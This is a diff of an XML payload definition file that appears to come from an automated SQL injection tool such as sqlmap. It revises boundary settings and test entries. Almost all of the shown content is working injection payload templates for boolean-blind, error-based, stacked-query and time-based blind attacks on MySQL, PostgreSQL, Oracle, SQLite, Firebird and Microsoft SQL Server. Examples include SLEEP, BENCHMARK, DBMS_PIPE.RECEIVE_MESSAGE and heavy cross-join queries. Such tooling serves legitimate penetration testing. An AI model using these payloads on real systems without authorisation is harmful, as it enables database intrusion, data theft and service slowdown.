@@ -235,7 +235,7 @@ Formats:
         <level>3</level>
         <clause>1</clause>
         <where>1,2</where>
-        <ptype>1</ptype>
+        <ptype>2</ptype>
         <prefix>'</prefix>
         <suffix></suffix>
     </boundary>
@@ -244,7 +244,7 @@ Formats:
         <level>4</level>
         <clause>1</clause>
         <where>1,2</where>
-        <ptype>1</ptype>
+        <ptype>2</ptype>
         <prefix>')</prefix>
         <suffix></suffix>
     </boundary>
@@ -253,7 +253,7 @@ Formats:
         <level>5</level>
         <clause>1</clause>
         <where>1,2</where>
-        <ptype>1</ptype>
+        <ptype>4</ptype>
         <prefix>"</prefix>
         <suffix></suffix>
     </boundary>
@@ -540,8 +540,6 @@ Formats:
 
 
     <!-- Boolean-based blind tests - Parameter replace -->
-    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
-    <!-- NOTE: this does not behave as expected against SQLite -->
     <test>
         <title>Generic boolean-based blind - Parameter replace</title>
         <stype>1</stype>
@@ -634,12 +632,11 @@ Formats:
             <dbms>Oracle</dbms>
         </details>
     </test>
+    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
     <!-- End of boolean-based blind tests - Parameter replace -->
 
 
     <!-- Boolean-based blind tests - GROUP BY and ORDER BY clauses -->
-    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
-    <!-- NOTE: this does not behave as expected against SQLite -->
     <test>
         <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses</title>
         <stype>1</stype>
@@ -732,6 +729,8 @@ Formats:
             <dbms>Oracle</dbms>
         </details>
     </test>
+    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
+    <!-- End of boolean-based blind tests - GROUP BY and ORDER BY clauses -->
 
 
     <!-- Error-based tests - WHERE clause -->
@@ -794,7 +793,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle AND error-based - WHERE clause</title>
+        <title>Oracle AND error-based - WHERE clause (XMLType)</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -929,7 +928,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle OR error-based - WHERE clause</title>
+        <title>Oracle OR error-based - WHERE clause (XMLType)</title>
         <stype>2</stype>
         <level>2</level>
         <risk>2</risk>
@@ -970,10 +969,10 @@ Formats:
     <test>
         <title>Oracle OR error-based - WHERE clause (ctxsys.drithsx.sn)</title>
         <stype>2</stype>
-        <level>3</level>
-        <risk>0</risk>
+        <level>4</level>
+        <risk>2</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
@@ -1195,9 +1194,9 @@ Formats:
 
 
     <!-- UNION query tests -->
-
     <!-- TODO: Think about proper structure for this -->
     <!-- End of UNION query tests -->
+
 
     <!-- Stacked queries tests -->
     <test>
@@ -1209,7 +1208,7 @@ Formats:
         <where>1</where>
         <request>
             <payload>; SELECT SLEEP([SLEEPTIME]);</payload>
-            <comment>--</comment>
+            <comment>#</comment>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -1221,7 +1220,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 stacked queries</title>
+        <title>MySQL &lt; 5.0.12 stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>2</level>
         <risk>0</risk>
@@ -1229,7 +1228,7 @@ Formats:
         <where>1</where>
         <request>
             <payload>; SELECT BENCHMARK(5000000, MD5('[SLEEPTIME]'));</payload>
-            <comment>--</comment>
+            <comment>#</comment>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1260,14 +1259,14 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL &lt; 8.2 stacked queries (EXISTS)</title>
+        <title>PostgreSQL &lt; 8.2 stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>3</level>
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
         <request>
-            <payload>; SELECT [RANDNUM] WHERE EXISTS(SELECT * FROM GENERATE_SERIES(1, 3000000));</payload>
+            <payload>; SELECT [RANDNUM] WHERE EXISTS(SELECT * FROM GENERATE_SERIES(1, 30000000));</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -1377,7 +1376,7 @@ Formats:
     </test>
 
     <test>
-        <title>SQLite &gt; 2.0 stacked queries</title>
+        <title>SQLite &gt; 2.0 stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>3</level>
         <risk>0</risk>
@@ -1397,7 +1396,7 @@ Formats:
     </test>
 
     <test>
-        <title>Firebird stacked queries</title>
+        <title>Firebird stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>3</level>
         <risk>0</risk>
@@ -1441,7 +1440,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 AND time-based blind</title>
+        <title>MySQL &lt; 5.0.12 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>2</level>
         <risk>1</risk>
@@ -1460,45 +1459,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle AND time-based blind</title>
-        <stype>5</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>1</where>
-        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>Oracle</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Oracle AND time-based blind (heavy query)</title>
-        <stype>5</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>1</where>
-        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)</payload>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>Oracle</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>PostgreSQL AND time-based blind</title>
+        <title>PostgreSQL AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>1</level>
         <risk>1</risk>
@@ -1506,7 +1467,7 @@ Formats:
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, 3000000)) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1, 3000000))</payload>
+            <payload>AND EXISTS(SELECT * FROM GENERATE_SERIES(1, 30000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1536,13 +1497,50 @@ Formats:
     </test>
 
     <test>
-        <title>SQLite &gt; 2.0 AND time-based blind</title>
+        <title>Oracle AND time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]', [SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)>0</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector></vector>
         <request>
             <payload>AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))</payload>
         </request>
@@ -1600,7 +1598,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 OR time-based blind</title>
+        <title>MySQL &lt; 5.0.12 OR time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>3</risk>
@@ -1618,6 +1616,44 @@ Formats:
         </details>
     </test>
     
+    <test>
+        <title>PostgreSQL OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, 3000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1, 3000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+
     <test>
         <title>Oracle OR time-based blind</title>
         <stype>5</stype>
@@ -1657,51 +1693,12 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL OR time-based blind</title>
-        <stype>5</stype>
-        <level>3</level>
-        <risk>3</risk>
-        <clause>1,2,3</clause>
-        <where>2</where>
-        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, 3000000)) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1, 3000000))</payload>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Microsoft SQL Server/Sybase OR time-based blind (heavy query)</title>
-        <stype>5</stype>
-        <level>3</level>
-        <risk>3</risk>
-        <clause>1,2,3</clause>
-        <where>2</where>
-        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
-        <request>
-            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)</payload>
-        </request>
-        <response>
-            <time>[DELAYED]</time>
-        </response>
-        <details>
-            <dbms>Microsoft SQL Server</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>SQLite &gt; 2.0 OR time-based blind</title>
+        <title>SQLite &gt; 2.0 OR time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>3</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector></vector>
         <request>
             <payload>OR LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))</payload>
         </request>
